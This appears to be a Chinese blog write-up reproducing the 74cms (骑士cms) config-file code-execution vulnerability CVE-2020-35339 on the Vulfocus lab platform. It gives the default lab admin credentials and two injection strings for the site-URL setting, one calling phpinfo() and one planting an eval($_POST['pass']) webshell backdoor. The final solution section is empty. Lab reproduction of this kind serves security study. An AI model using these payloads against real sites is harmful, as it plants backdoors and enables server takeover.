# 原创
：  【漏洞复现-骑士cms-代码执行】vulfocus/骑士cms_cve_2020_35339

# 【漏洞复现-骑士cms-代码执行】vulfocus/骑士cms_cve_2020_35339

**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、知识:](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[1.3、描述：](#1.3%E3%80%81%E6%8F%8F%E8%BF%B0%EF%BC%9A)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.4、解题：](#2.4%E3%80%81%E8%A7%A3%E9%A2%98%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[Vulfocus 漏洞威胁分析平台](https://vulfocus.cn/)

123.58.224.8:57171
123.58.224.8:36168
<img alt="" height="672" src="https://img-blog.csdnimg.cn/64e703ffb5d844b9ac7163c4f4ef9ff7.png" width="901"/>​
 123.58.224.8:36168
<img alt="" height="914" src="https://img-blog.csdnimg.cn/cdc530e58ab94b599be25f98f66e349c.png" width="1200"/>​
 


> 
<h3>1.2、知识:</h3>
1、配置文件错误配置（审计）
此题漏洞点在配置文件，且配置文件是php后缀
2、php语句
应该让写入的代码为php语言执行，而不是字符串。可以使用‘闭合，再用,使其独立
（还得考虑是否被过滤了）


> 
<h3>1.3、描述：</h3>
管理后台由于过滤不严谨，可以向配置文件写入恶意代码导致任意代码执行


---


---


## 二、漏洞验证

> 
<h3>2.1、分析</h3>
在URL后面加上/index.php?m=Admin
（访问后台）
题目提示：账号密码均为
adminadmin

 
 插入PHPinfo()
 ​​​​​​​http://127.0.0.1/.',phpinfo(),'/.com<img alt="" height="911" src="https://img-blog.csdnimg.cn/3fe36f5ad79d463ca8226302b6afe2e8.png" width="1200"/>
 刷新页面后，又回到了后台登陆页面
 
 现在一登陆进去就是这个页面了

 
<hr/>
写入后门连接代码
http://127.0.0.1/.',eval($_POST['pass']),'/.com

点击保存修改
<img alt="" height="894" src="https://img-blog.csdnimg.cn/f2bd16a4a50f48e482376eecc6129627.png" width="1200"/> 
 刷新页面后，又回到了后台登陆页面
http://123.58.224.8:61983/index.php?m=Admin&amp;c=index&amp;a=login

 

 <img alt="" height="803" src="https://img-blog.csdnimg.cn/081264e4d2f845089fe76f264f2dd702.png" width="1200"/>
 




> 
<h3>2.4、解题：</h3>

 或者

 

